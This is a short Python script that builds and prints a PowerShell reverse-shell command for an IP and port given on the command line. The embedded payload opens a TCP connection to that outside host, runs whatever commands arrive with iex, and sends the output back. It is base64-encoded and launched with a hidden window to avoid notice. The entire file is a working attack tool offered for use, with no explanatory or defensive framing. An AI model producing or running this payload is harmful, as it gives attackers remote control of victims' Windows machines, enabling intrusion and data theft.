import sys
import base64

def main():
    if len(sys.argv) != 3:
        print(f"\n[!] Incorrect usage.\nUsage: {sys.argv[0]} <IP> <PORT>\nExample: {sys.argv[0]} 192.168.1.1 4444\n")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    
    payload = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
    
    cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf-16le')).decode()
    
    print(cmd)

if __name__ == "__main__":
    main()
